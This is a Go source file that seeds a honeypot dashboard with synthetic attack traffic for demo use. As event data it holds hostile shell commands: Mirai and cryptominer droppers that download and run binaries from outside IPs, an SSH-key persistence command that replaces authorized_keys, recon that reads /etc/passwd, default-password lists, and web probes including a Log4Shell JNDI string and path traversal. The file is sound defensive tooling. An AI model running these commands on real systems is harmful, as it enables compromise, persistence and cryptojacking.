// Package seed generates synthetic honeypot traffic for local development
// (DEMO=1). It is never used when real data is available.
package seed

import (
	"fmt"
	"math"
	"math/rand"
	"time"

	"sec_dash/backend/internal/geo"
	"sec_dash/backend/internal/model"
	"sec_dash/backend/internal/store"
)

type place struct {
	code, name, city string
	lat, lon         float64
	asn, org         string
}

var places = []place{
	{"CN", "China", "Hangzhou", 30.27, 120.15, "AS4134", "CHINANET-BACKBONE"},
	{"CN", "China", "Shenzhen", 22.54, 114.06, "AS4837", "CHINA UNICOM"},
	{"US", "United States", "Ashburn", 39.04, -77.49, "AS14061", "DigitalOcean"},
	{"US", "United States", "Dallas", 32.78, -96.8, "AS396982", "Google Cloud"},
	{"RU", "Russia", "Moscow", 55.75, 37.62, "AS12389", "Rostelecom"},
	{"NL", "Netherlands", "Amsterdam", 52.37, 4.9, "AS60781", "LeaseWeb"},
	{"DE", "Germany", "Frankfurt", 50.11, 8.68, "AS24940", "Hetzner Online"},
	{"IN", "India", "Mumbai", 19.08, 72.88, "AS55836", "Reliance Jio"},
	{"BR", "Brazil", "Sao Paulo", -23.55, -46.63, "AS28573", "Claro Brasil"},
	{"VN", "Vietnam", "Hanoi", 21.03, 105.85, "AS7552", "Viettel"},
	{"KR", "South Korea", "Seoul", 37.57, 126.98, "AS4766", "Korea Telecom"},
	{"IR", "Iran", "Tehran", 35.69, 51.39, "AS58224", "TIC"},
	{"ID", "Indonesia", "Jakarta", -6.2, 106.85, "AS7713", "Telkom Indonesia"},
	{"FR", "France", "Roubaix", 50.69, 3.17, "AS16276", "OVH"},
	{"SG", "Singapore", "Singapore", 1.35, 103.82, "AS14061", "DigitalOcean"},
	{"UA", "Ukraine", "Kyiv", 50.45, 30.52, "AS15895", "Kyivstar"},
	{"TR", "Turkey", "Istanbul", 41.01, 28.98, "AS9121", "Turk Telekom"},
	{"PL", "Poland", "Warsaw", 52.23, 21.01, "AS5617", "Orange Polska"},
}

var (
	users  = []string{"root", "admin", "ubuntu", "user", "test", "pi", "oracle", "postgres", "ftpuser", "git", "deploy", "guest", "support", "ubnt", "hadoop", "debian"}
	pwds   = []string{"123456", "password", "admin", "root", "1234", "12345", "toor", "raspberry", "ubnt", "admin123", "qwerty", "P@ssw0rd", "letmein", "test", "default", "changeme", "Passw0rd!", "1q2w3e4r", "vagrant", "ubuntu"}
	banner = []string{"SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-OpenSSH_8.9p1", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-PuTTY_Release_0.70", "SSH-2.0-AsyncSSH_2.14.2", "SSH-2.0-libssh2_1.10.0"}
	webs   = []string{"/", "/robots.txt", "/wp-login.php", "/xmlrpc.php", "/.env", "/.git/config", "/phpmyadmin/", "/admin", "/login", "/cgi-bin/luci", "/boaform/admin/formLogin",
		"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/actuator/env", "/HNAP1/", "/?x=${jndi:ldap://x.example/a}", "/config.json", "/backup.sql", "/solr/admin/info/system", "/manager/html", "/wp-content/plugins/x/readme.txt", "/../../etc/passwd", "/setup.cgi?next_file=netgear.cfg"}
)

type actor struct {
	ip     string
	pl     place
	kind   string
	weight float64
	start  time.Time
}

// Populate fills the store with ~10 days of plausible traffic.
func Populate(st *store.Store, _ *geo.Resolver) {
	rng := rand.New(rand.NewSource(7))
	now := time.Now().UTC()
	begin := now.Add(-10 * 24 * time.Hour)

	mkIP := func() string {
		return fmt.Sprintf("%d.%d.%d.%d", 45+rng.Intn(170), rng.Intn(255), rng.Intn(255), 1+rng.Intn(253))
	}
	var actors []*actor
	add := func(kind string, n int, w float64) []*actor {
		var out []*actor
		for i := 0; i < n; i++ {
			a := &actor{ip: mkIP(), pl: places[rng.Intn(len(places))], kind: kind, weight: w,
				start: begin.Add(time.Duration(rng.Int63n(int64(10 * 24 * time.Hour))))}
			actors = append(actors, a)
			out = append(out, a)
		}
		return out
	}
	add("scanner", 70, 1)
	add("bruteforce", 28, 3)
	add("sprayer", 6, 4)
	add("web", 40, 2)
	add("miner", 9, 1)
	add("mirai", 14, 1)
	add("mdrfckr", 11, 1)
	add("recon", 8, 1)

	var evs []*model.Event
	push := func(e *model.Event, a *actor) {
		e.Geo = model.Geo{CountryCode: a.pl.code, CountryName: a.pl.name, City: a.pl.city,
			Latitude: a.pl.lat + rng.Float64()*0.6 - 0.3, Longitude: a.pl.lon + rng.Float64()*0.6 - 0.3, ASN: a.pl.asn, Org: a.pl.org}
		e.IP = a.ip
		evs = append(evs, e)
	}
	sid := func() string { return fmt.Sprintf("%012x", rng.Int63()&0xffffffffffff) }
	cow := func(t time.Time, sess, raw, kind string) *model.Event {
		return &model.Event{Time: t, Sensor: "vm-honeypot", Source: "cowrie", Kind: kind, RawType: raw, Session: sess, Proto: "ssh", DstPort: 22, Port: 30000 + rng.Intn(30000)}
	}
	// intense diurnal weight: more at certain hours + a recent surge
	when := func(a *actor) time.Time {
		for {
			t := a.start.Add(time.Duration(rng.Int63n(int64(36 * time.Hour))))
			if t.After(now) {
				t = now.Add(-time.Duration(rng.Intn(3600)) * time.Second)
			}
			h := float64(t.Hour())
			if rng.Float64() < 0.55+0.45*math.Sin((h-4)/24*2*math.Pi) {
				return t
			}
		}
	}

	session := func(a *actor, t time.Time, nFail int, success bool, cmds []string, dl *[3]string) {
		id := sid()
		push(cow(t, id, "cowrie.session.connect", model.KindConnect), a)
		c := cow(t.Add(200*time.Millisecond), id, "cowrie.client.version", model.KindClientVersion)
		c.Client = banner[rng.Intn(len(banner))]
		push(c, a)
		cur := t.Add(time.Second)
		for i := 0; i < nFail; i++ {
			f := cow(cur, id, "cowrie.login.failed", model.KindLoginFailed)
			f.User, f.Pass = users[rng.Intn(len(users))], pwds[rng.Intn(len(pwds))]
			push(f, a)
			cur = cur.Add(time.Duration(300+rng.Intn(900)) * time.Millisecond)
		}
		if success {
			s := cow(cur, id, "cowrie.login.success", model.KindLoginSuccess)
			s.User, s.Pass = "root", []string{"123456", "root", "admin"}[rng.Intn(3)]
			push(s, a)
			cur = cur.Add(time.Duration(1+rng.Intn(3)) * time.Second)
			for _, cmd := range cmds {
				x := cow(cur, id, "cowrie.command.input", model.KindCommand)
				x.Input = cmd
				push(x, a)
				cur = cur.Add(time.Duration(500+rng.Intn(4000)) * time.Millisecond)
			}
			if dl != nil {
				d := cow(cur, id, "cowrie.session.file_download", model.KindDownload)
				d.URL, d.SHA256, d.Size = dl[0], dl[1], int64(40000+rng.Intn(900000))
				d.Input = dl[2]
				push(d, a)
				cur = cur.Add(2 * time.Second)
			}
		}
		cl := cow(cur, id, "cowrie.session.closed", model.KindClose)
		cl.Duration = cur.Sub(t).Seconds()
		push(cl, a)
	}

	miner := [3]string{"http://185.234.72.19/xmr/kdevtmpfsi", "9c2f6e0b1d6c1d8c0a3f8d1f4b7a5e92c4f6a3b8d1e0f7a2b9c4d6e8f0a1b2c3", ""}
	mirai := [3]string{"http://94.156.8.77/bins/mirai.mpsl", "3b7d1a9e5c2f8046d9e1b3a7c5f20486e9d1a3b5c7f9e0d2a4b6c8e0f1a3b5c7", ""}
	for _, a := range actors {
		n := 1
		switch a.kind {
		case "scanner":
			n = 1 + rng.Intn(4)
		case "bruteforce":
			n = 2 + rng.Intn(6)
		case "sprayer":
			n = 4 + rng.Intn(8)
		case "web":
			n = 1 + rng.Intn(3)
		case "miner", "mirai", "mdrfckr", "recon":
			n = 1 + rng.Intn(3)
		}
		for i := 0; i < n; i++ {
			t := when(a)
			switch a.kind {
			case "scanner":
				session(a, t, 0, false, nil, nil)
			case "bruteforce":
				session(a, t, 4+rng.Intn(30), rng.Float64() < 0.07, []string{"uname -a", "whoami"}, nil)
			case "sprayer":
				session(a, t, 15+rng.Intn(40), false, nil, nil)
			case "recon":
				session(a, t, rng.Intn(3), true, []string{"uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "whoami", "w", "ls -la /root", "cat /etc/passwd"}, nil)
			case "miner":
				d := miner
				session(a, t, rng.Intn(3), true, []string{"cd /tmp || cd /var/tmp", "wget http://185.234.72.19/xmr/kdevtmpfsi -O kdevtmpfsi", "chmod +x kdevtmpfsi", "nohup ./kdevtmpfsi -o stratum+tcp://pool.example:3333 &", "crontab -l"}, &d)
			case "mirai":
				d := mirai
				session(a, t, rng.Intn(2), true, []string{"enable", "system", "shell", "sh", "cd /tmp; wget http://94.156.8.77/bins/mirai.mpsl; chmod 777 mirai.mpsl; ./mirai.mpsl ssh", "rm -rf mirai.mpsl"}, &d)
			case "mdrfckr":
				session(a, t, rng.Intn(3), true, []string{
					"cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWzrMCbL2qwqU0+G4V5KOdiUgqVN4nSFkj ssh-rsa mdrfckr\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh",
					"uname -s -v -n -r -m", "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'", "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"}, nil)
			case "web":
				for k := 0; k < 3+rng.Intn(10); k++ {
					tt := t.Add(time.Duration(k) * 2 * time.Second)
					p := webs[rng.Intn(len(webs))]
					e := &model.Event{Time: tt, Sensor: "vm-snare", Source: "snare", Kind: model.KindHTTP, RawType: "snare.http.request",
						Proto: "http", DstPort: 80, Port: 40000 + rng.Intn(20000), Method: "GET", Path: p, Input: "GET " + p + " HTTP/1.1"}
					push(e, a)
				}
			}
		}
	}
	// a fresh burst so "live" widgets have recent data
	for i := 0; i < 6; i++ {
		a := actors[rng.Intn(len(actors))]
		if a.kind == "web" || a.kind == "scanner" {
			session(a, now.Add(-time.Duration(rng.Intn(1200))*time.Second), 0, false, nil, nil)
		}
	}
	st.Add(evs, false)
}
